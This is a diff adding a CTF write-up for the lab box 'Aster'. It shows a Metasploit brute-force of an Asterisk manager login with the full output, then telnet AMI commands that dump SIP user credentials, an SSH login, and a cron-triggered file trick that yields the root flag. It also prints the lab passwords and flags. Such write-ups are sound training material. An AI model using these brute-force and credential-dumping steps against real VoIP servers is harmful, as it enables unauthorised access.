@@ -1,12 +1,14 @@
 ---
 layout: default
 title: Aster
-status: incomplete
 ---
 
 ## TL;DR
 
+In this challenge we starts with password enumeration on the `asterisk` service, based on the username we find from `output.pyc` which we decompile.
+Then, after find the password, we login and grab the `SIP records`, which gives us the credentials of user `harry`.
 
+We can grab the root flag by simply creating the file `/tmp/flag.dat`. It can be inferred by decompiling the .jar file we find on the home folder.
 
 ### Recon
 
@@ -41,8 +43,17 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 I added `aster.thm` to my `/etc/hosts`
 
-### ...
+### Password enumeration on asterisk service and find records of SIP users hold credentials for user harry
 
+When visiting the main page, we can see only the option for download `output.pyc`:
+
+![download](image-1.png)
+
+I downloaded this file, and uploaded it to [https://www.lddgo.net/en/string/pyc-compile-decompile](https://www.lddgo.net/en/string/pyc-compile-decompile), in order to decompile it back to python code:
+
+![decompile](image-2.png)
+
+This is the source code.
 ```py
 import pyfiglet
 o0OO00 = pyfiglet.figlet_format('Hello!!')
@@ -59,8 +70,141 @@ if 0:
 print o0OO00
 ```
 
-###
+I decoded the two strings using python terminal:
+```txt
+Good job reverser, python is very cool!Good job reverser, python is very cool!Good job reverser, python is very cool!
+Good job, user "admin" the open source framework for building communications, installed in the server.
+```
 
- Privilege Escalation to Root
+![decoding](image-3.png)
+
+It tells us that there is some `open source framework for building communications`, with the user `admin`.
+This is exactly what Asterisk is:
+> Asterisk is a prominent open-source framework for building telecommunication applications like private branch exchanges (PBX) and voice-over-IP (VoIP) systems.
+
+We'll use the steps from here [https://www.hackingarticles.in/penetration-testing-on-voip-asterisk-server-part-2/](https://www.hackingarticles.in/penetration-testing-on-voip-asterisk-server-part-2/), we want to brute forcing the password of user `admin` using metasploit:
+
+We'll use the module `auxiliary/voip/asterisk_login`, and the default passwords supplied with metasploit
+```bash
+msf auxiliary(voip/asterisk_login) > set USERNAME admin
+USERNAME => admin
+msf auxiliary(voip/asterisk_login) > set RHOSTS 10.67.189.105
+RHOSTS => 10.67.189.105
+msf auxiliary(voip/asterisk_login) > run
+[*] 10.67.189.105:5038    - Initializing module...
+[*] 10.67.189.105:5038    - 10.67.189.105:5038 - Trying user:'admin' with password:'admin'
+[*] 10.67.189.105:5038    - 10.67.189.105:5038 - Trying user:'admin' with password:'123456'
+[*] 10.67.189.105:5038    - 10.67.189.105:5038 - Trying user:'admin' with password:'12345'
+[*] 10.67.189.105:5038    - 10.67.189.105:5038 - Trying user:'admin' with password:'123456789'
+[*] 10.67.189.105:5038    - 10.67.189.105:5038 - Trying user:'admin' with password:'password'
+[*] 10.67.189.105:5038    - 10.67.189.105:5038 - Trying user:'admin' with password:'iloveyou'
+[*] 10.67.189.105:5038    - 10.67.189.105:5038 - Trying user:'admin' with password:'princess'
+[*] 10.67.189.105:5038    - 10.67.189.105:5038 - Trying user:'admin' with password:'1234567'
+[*] 10.67.189.105:5038    - 10.67.189.105:5038 - Trying user:'admin' with password:'12345678'
+[*] 10.67.189.105:5038    - 10.67.189.105:5038 - Trying user:'admin' with password:'abc123'
+[+] 10.67.189.105:5038    - User: "admin" using pass: "abc123" - can login on 10.67.189.105:5038!
+```
+
+We found the password `abc123` for user `admin`.
+
+![metasploit](image-4.png)
 
 
+Now, we first want to login, we need to use telnet in order to communicate with the service:
+```bash
+telnet aster.thm 5038
+```
+
+Then, we can paste this payload for login
+```bash
+Action: Login
+Username: admin
+Secret: abc123
+```
+
+After successful authenticating, we want to list all SIP users:
+```bash
+Action: command
+Command:  sip show users
+```
+
+![list SIP users](image-5.png)
+
+We got the credentials of user `harry`:
+```bash
+harry:p4ss#w0rd!#
+```
+
+Let's login using ssh to user `harry`:
+
+![login](image-6.png)
+
+we can grab the user flag:
+```bash
+harry@ubuntu:~$ cat user.txt 
+thm{bas1c_aster1ck_explotat1on}
+```
+
+### Achieve root flag using decompile of .jar file found and create /tmp/flag.dat
+
+We can see the file `Example_Root.jar` on the home folder.
+
+![Example_Root.jar](image-7.png)
+
+I downloaded this file and uploaded it to [https://www.decompiler.com/jar/f4548f38e57747bdb71dbdf2633b17ad/Example_Root.jar](https://www.decompiler.com/jar/f4548f38e57747bdb71dbdf2633b17ad/Example_Root.jar), for decompile back to java.
+
+![decompile](image-8.png)
+
+This is the source code after decompilation:
+```java
+┌──(agonen㉿kali)-[~/thm/Aster/Example_Root]
+└─$ cat Example_Root.java 
+import java.io.File;
+import java.io.FileWriter;
+import java.io.IOException;
+
+public class Example_Root {
+   public static boolean isFileExists(File var0) {
+      return var0.isFile();
+   }
+
+   public static void main(String[] var0) {
+      String var1 = "/tmp/flag.dat";
+      File var2 = new File(var1);
+
+      try {
+         if (isFileExists(var2)) {
+            FileWriter var3 = new FileWriter("/home/harry/root.txt");
+            var3.write("my secret <3 baby");
+            var3.close();
+            System.out.println("Successfully wrote to the file.");
+         }
+      } catch (IOException var4) {
+         System.out.println("An error occurred.");
+         var4.printStackTrace();
+      }
+
+   }
+}
+```
+
+Okay, It looks like it checks whether the file `/tmp/flag.dat` exists, and if so, it writes some string to `/home/harry/root.txt`.
+
+When I checked for cronjobs, I saw there is some java task being executed, also pspy64 showed me that
+
+![/etc/crontab](image-9.png)
+
+Let's create the file `/tmp/flag.dat`, and wait for the task to run:
+```bash
+touch /tmp/flag.dat
+```
+
+It worked! 
+
+![root flag](image-10.png)
+
+We got our root flag
+```bash
+harry@ubuntu:~$ cat root.txt 
+thm{fa1l_revers1ng_java}
+```
